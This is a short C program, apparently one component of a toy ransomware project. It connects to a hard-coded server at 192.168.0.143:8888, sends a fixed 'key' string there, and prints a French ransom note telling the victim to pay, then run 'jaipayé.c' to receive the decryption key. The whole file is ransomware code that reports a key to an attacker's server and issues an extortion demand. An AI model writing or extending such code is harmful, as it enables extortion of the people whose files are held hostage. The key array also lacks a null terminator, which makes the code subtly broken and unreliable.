#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>
#define BUFFER_SIZE 1024

int main (){
    
    int sockid;
    int server_port = 8888;
    char *server_ip = "192.168.0.143";

    sockid = socket(AF_INET, SOCK_STREAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    char key[64] = "hfqssqkfdqshflkqhfqssqkfdqshflkqhfqssqkfdqshflkqhfqssqkfdqshflkq";
    char msg[97];
    if(connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0){
    	printf("Erreur lors de la connection");
    	exit(1);
    }
    send(sockid,(const char *)key,strlen(key),0);
    close(sockid);
    printf("Lorsque vous avez payé la rançon lancez le programme jaipayé.c la clé de déchiffrage vous sera donnée dans l'heure");
    
}
